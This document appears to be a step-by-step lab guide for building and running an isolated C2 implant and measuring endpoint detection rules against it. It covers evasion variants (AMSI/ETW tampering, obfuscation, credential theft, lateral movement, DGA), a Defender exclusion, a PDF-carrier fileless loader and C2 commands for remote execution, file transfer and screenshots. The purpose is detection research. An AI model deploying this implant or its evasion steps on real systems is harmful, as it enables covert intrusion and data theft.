# PHANTOM-X :: the complete walk-through

Everything, in the order it has to happen, and nothing that is not
needed for that step.

Two machines are assumed:

| | |
|---|---|
| **the HOST** | where the C2 server runs and where the telemetry is evaluated. Your own machine. |
| **the VM** | the Windows 11 Pro research VM the payload runs on |

The lab works on one machine too — the demos in step 8 do exactly that —
but the measurement is only meaningful when the endpoint is somewhere
else.

---

# PART 1 -- SET UP ONCE

## Step 1. The toolchains

The lab is built from three toolchains. A missing one is reported as
*skipped* with the reason, not as a failure.

| Tool | Needed for | If missing |
|---|---|---|
| **MSVC** (VS Build Tools) + Windows SDK | the payload, the loader, the hollow tool | no C components at all |
| **Go** | the C2 server | use the Python reference server instead |
| **Rust** | the PDF scanner, the rule generator | no scanner, no rules |

```powershell
# check them
& "C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
go version
cargo --version
python --version
```

## Step 2. Isolate the VM — BEFORE ANYTHING ELSE

**This is the control that contains the risk, so it goes in first.**
Locking the machine down afterwards is a statement of intent; locking it
down first is a control.

**On the HOST:**

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase0_labnet
.\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001
```

**On the VM:**

```powershell
cd C:\pxvm\phase0_labnet
.\setup_vm_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
.\verify_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
```

The verification must report **PASS on all four checks**. If `HOME-1`
or `HOME-2` passes — meaning the home network IS reachable — **stop and
fix it before going further**.

The VM will have no internet afterwards. That is deliberate. Install
anything it needs from the host, over the lab segment, first.

### Using Tailscale instead

If the VM is on a different network, see
[`phase0_labnet/TAILSCALE.md`](../phase0_labnet/TAILSCALE.md). The
short version: put both machines on a tailnet, and apply the lockdown
with the Tailscale allowances so the tunnel is not blocked by the
default-deny.

```powershell
# on the VM
.\setup_vm_labnet.ps1 -Tailscale -LabGateway c2box.tail1234.ts.net -C2Port 9001
```

## Step 3. Prepare the VM

```powershell
cd C:\pxvm\phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
```

Network lockdown, then the Defender posture *reported but not changed*,
then Mark-of-the-Web, then the Sysmon check.

## Step 4. Build everything

**On the HOST:**

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

This builds the payload, the loader, the hollow tool, the C2 server,
both Rust tools and the carrier PDF, in dependency order.

## Step 5. Build the variant matrix

```powershell
.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

Fourteen arms: `baseline`, `obfuscate`, `amsi`, `etw`, `encrypt`,
`dga`, `cred`, `lateral`, `resilient`, `xfer`, `caps`, `all`,
`stealth`, `full`.

The build also **verifies the obfuscation arm** by scanning the
compiled binary for every sensitive literal:

```
baseline : 11/22 needles visible
obfuscate: no needle found -- the arm is clean
```

## Step 6. Stop the endpoint eating your own build

The lab's payload is detected — as `Trojan:Win32/Wacatac.H!ml` — and
Defender quarantines it. That is one of the lab's findings, and it also
makes the regression suite unreliable.

**On the HOST, in an ADMINISTRATOR PowerShell, once:**

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase4_defender
.\exclude_lab_output.ps1
```

It adds a Defender **exclusion** for the build output. Defender stays
ON — it still scans everything else, still logs, still alerts. The only
thing it stops doing is eating the files the lab builds for itself.

This does **not** weaken the measurement: the payload is deployed to
the VM at a different path, with no exclusion, and the endpoint there
still sees every technique the lab exercises.

To undo it:

```powershell
.\exclude_lab_output.ps1 -Remove
```

---

# PART 2 -- RUN THE LAB

## Step 7. Start the C2 server

**On the HOST:**

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase5_network
.\px_c2.exe --host 0.0.0.0 --port 9001 --log c2_audit.jsonl --quarantine C:\pxvm\quarantine
```

| Flag | Meaning |
|---|---|
| `--host` | **use `0.0.0.0`**, not `127.0.0.1`, or the VM cannot reach it |
| `--port` | bind port (9001) |
| `--log` | the JSONL audit log — this is the telemetry |
| `--quarantine` | where received file transfers are written |
| `--key` | the shared channel key, if you are not using the built-in one |

## Step 8. Prove it works

Two demos, both on one machine, neither needing the VM.

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase5_network

# the technique library, end to end
python demo_capabilities.py

# the payload finding the server on its own
python demo_auto_connect.py
```

The first prints the operator's console, the payload's own log, and the
audit record for every technique:

```
  c2>   -> session 1: whoami
    <- session 1: exit=0 (29.6ms)
         desktop-td3a3hk\sycodilico
  c2>   -> session 1: capability recon sysinfo
    <- session 1: exit=0 (0.5ms)
         host=DESKTOP-TD3A3HK os=6.2.9200 build=9200 arch=9 cpus=24
```

## Step 9. Build what goes to the target

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x\phase3_fileless\loader

# the direct route: one executable
.\make_target_bundle.ps1 -C2Host 192.168.77.1 -C2Port 9001 -Arm all

# the carrier route: the payload inside a document
.\make_target_bundle.ps1 -C2Host 192.168.77.1 -C2Port 9001 -Arm all -Carrier
```

The output is `dist\phantom-x-target-all\` with a manifest, a
`START-HERE.txt`, and a zip. **The C2 address is already compiled in** —
there is no environment variable to set and nothing to configure.

To point it somewhere else, rebuild with a different `-C2Host`. The
payload resolves the name every time it connects, so a hostname lets
the server move without a rebuild.

## Step 10. Deploy to the VM

Copy `dist\phantom-x-target-all\` to the VM — a shared folder, `scp`, a
USB stick. On the VM:

```powershell
cd C:\pxvm\pxlab
```

### The direct route

```powershell
.\px_payload_all.exe
```

It prints its own log and keeps retrying until the server is reachable.
The server and the payload can start in **either order**.

### The carrier route

```powershell
# on the VM, elevated
Unblock-File .\px_carrier.pdf
.\install_pdf_handler.ps1 -LoaderPath .\px_loader.exe

# then open it the way any document is opened
.\px_carrier.pdf
```

The payload is inside the PDF. The loader inflates it and maps it **in
memory** — it never touches the disk.

The Mark-of-the-Web and SmartScreen are part of the measurement: a
document that arrives over a network is a different file to the
endpoint than one that came from a shared folder.

## Step 11. Drive it

On the HOST, in the C2 console:

```
list                      active sessions
exec 1 whoami             run a command in session 1
exec all ver              run it in every session
ping 1                    round-trip latency
cap 1 list                what this build can do
cap 1 recon sysinfo       run one technique
dl 1 C:\Windows\win.ini   transfer a file
shot 1                    capture the screen
kill 1                    clean shutdown (EXIT)
stats                     counters
```

A note on `exec`: the protocol uses `|` as a field separator, so a
pipe inside a command has to be quoted — `exec 1 cmd /c "a | b"`.

## Step 12. Collect the telemetry

**On the VM**, in an elevated PowerShell:

```powershell
cd C:\pxvm\phase8_evaluation
.\collect_events.ps1 -Label baseline_arm
```

It collects Sysmon, Defender, Task Scheduler, DNS, PowerShell and the
service log over a window, and writes JSON. **It clears nothing** — the
point is to leave the evidence in place.

## Step 13. Evaluate the rules

**On the HOST:**

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x

.\phase7_detection\target\release\px_detect.exe --emit json > rules.json
.\phase7_detection\target\release\px_detect.exe --emit catalog > catalog.json

python .\phase8_evaluation\px_eval.py --rules rules.json --events events_baseline_arm.json

python .\phase8_evaluation\coverage.py `
    --rules rules.json --catalog catalog.json `
    --baseline events_baseline_arm.json `
    --variant events_obfuscate_arm.json
```

The output that matters is the last section:

```
  RULES THAT FIRED ON THE BASELINE AND ARE SILENT ON THE VARIANT
  (these were riding on something the variant removed)

    px-002  PDF File Opened By An Unusual Loader Process
          catches: the loader, on every arm
```

That is the finding, and it is about the **rule**, not about the
payload. A rule that stops working when a string is encoded was never
detecting the technique — it was detecting a string.

## Step 14. Read the coverage matrix

```powershell
.\phase7_detection\target\release\px_detect.exe --catalog-summary
```

```
  techniques in scope   : 93
  measured              : 65
  ruled but not measured: 6
  not exercised at all  : 22
  of which campaigns    : 4
```

Three statuses, and they are not equally good:

| Status | Meaning |
|---|---|
| `measured` | the lab exercises it, so the telemetry is real and the rule has been tested against it |
| `ruled` | a rule exists, but nobody has watched it fire. **A rule that has never fired is a hypothesis.** |
| `not_exercised` | neither. The lab says nothing about it, and the catalogue says so. |

---

# PART 3 -- REPEAT AND COMPARE

## Step 15. Compare two arms

The lab's question is never "does this technique work". It is **what
changes in what the endpoint sees when this technique is used**, and
that needs both arms run and diffed.

```powershell
# on the VM
.\collect_events.ps1 -Label baseline_arm
# ... run the baseline arm ...
.\collect_events.ps1 -Label baseline_arm_2

# ... run the variant arm ...
.\collect_events.ps1 -Label obfuscate_arm

# on the HOST
python .\phase8_evaluation\coverage.py --rules rules.json --catalog catalog.json `
    --baseline events_baseline_arm.json --variant events_obfuscate_arm.json
```

## Step 16. Run the whole regression

```powershell
cd C:\Users\SycoDiliCo\projects\phantom-x
python run_all_tests.py
```

Fourteen checks: the formatter self-test, the SHA-256 against the FIPS
vectors, the PDF scanner against the Python reference, the Go C2 server
against the Python reference, the Go C2 server against the **real
payload**, every variant arm, the reconnect behaviour, the evaluator,
the capability library, the coverage matrix, the rule-field check, the
endpoint's verdict, and the Sysmon schema.

```powershell
python run_all_tests.py --elevate     # re-launch elevated
python run_all_tests.py --runs 100    # drive the arms 100 times
```

**Run it elevated on the build machine.** Without elevation the arms
the endpoint quarantines are reported as `blocked-by-defender` and the
DGA arm as `needs-elevation` — both findings, neither a failure.

---

# THE THINGS THAT WILL BITE YOU

| Symptom | Cause | Fix |
|---|---|---|
| `variant payload not found` | Defender quarantined the arm | run step 6 |
| the payload never connects | the C2 address is wrong | check `START-HERE.txt` in the bundle |
| `connect failed (10061)` | nothing is listening | is the server running, and on `0.0.0.0`? |
| the DGA arm never connects | the hosts entry needs admin | run the suite elevated |
| the payload connects and dies | the C2 changed network | use the `resilient` arm |
| `PX_C2_HOST` seems ignored | the arm is `dga` | the DGA arm replaces the host by design |

---

# ONE COMMAND SUMMARY

```powershell
# HOST
cd C:\Users\SycoDiliCo\projects\phantom-x
.\phase3_fileless\loader\build_all.ps1 -C2Host 192.168.77.1
.\phase3_fileless\loader\build_variants.ps1 -C2Host 192.168.77.1
.\phase3_fileless\loader\make_target_bundle.ps1 -C2Host 192.168.77.1 -Arm all -Carrier
.\phase5_network\px_c2.exe --host 0.0.0.0 --port 9001 --log c2_audit.jsonl

# VM
.\px_carrier.pdf          # or .\px_payload_all.exe

# HOST, after the run
cd C:\pxvm\phase8_evaluation   # on the VM: .\collect_events.ps1 -Label run
python .\phase8_evaluation\coverage.py --rules rules.json --catalog catalog.json
```
